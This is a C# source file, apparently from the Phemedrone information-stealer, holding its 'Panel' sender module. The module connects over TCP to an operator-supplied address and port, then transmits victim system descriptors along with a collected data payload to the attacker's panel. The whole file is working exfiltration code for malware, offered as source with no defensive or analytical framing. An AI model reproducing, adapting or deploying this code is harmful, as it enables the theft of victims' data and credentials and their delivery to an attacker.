using System;
using System.IO;
using System.Net.Sockets;
using Phemedrone.Services;

namespace Phemedrone.Senders
{
    /// <summary>
    /// genius move
    /// </summary>
    /// <param name="ip"></param>
    /// <param name="port"></param>
    public class Panel : ISender
    {
        public Panel(string ip) : base(ip)
        {
        }
        public override void Send(byte[] data)
        {
            var dataSplit = Arguments[0].ToString().Split(':');
            var infoArray = Information.InfoArray();
            SendPanel(dataSplit[0], Convert.ToInt32(dataSplit[1]), infoArray, data);
        }
        
        private void SendPanel(string ip, int port, string[] descriptoins, byte[] fileData)
        {
            using (var client = new TcpClient())
            {
                client.Connect(ip, port);

                using (var stream = client.GetStream())
                {
                    using (var memStream = new MemoryStream())
                    {
                        using (var writer = new BinaryWriter(memStream))
                        {
                            writer.Write(BitConverter.GetBytes(
                                descriptoins.Length)); // 4 bytes

                            foreach (var description in descriptoins)
                            {
                                //writer.Write(description.Length);
                                writer.Write(description);
                            }
                            
                            writer.Write(fileData.Length);
                            writer.Write(fileData);
                        }

                        var data = memStream.ToArray();
                        stream.Write(data, 0, data.Length);
                    }
                    
                    /*byte[] buffer = new byte[descriptoins.Length + fileData.Length + 1];
                    Array.Copy(Encoding.UTF8.GetBytes(descriptoins + "|"), buffer, descriptoins.Length + 1);
                    Array.Copy(fileData, buffer, fileData.Length);
                    //byte[] infoBytes = System.Text.Encoding.UTF8.GetBytes(descriptoins);
                    //stream.Write(infoBytes, 0, infoBytes.Length);
                    //stream.Write(fileData, 0, fileData.Length);
                    stream.Write(buffer, 0, buffer.Length);*/
                }
            }
        }
    }
}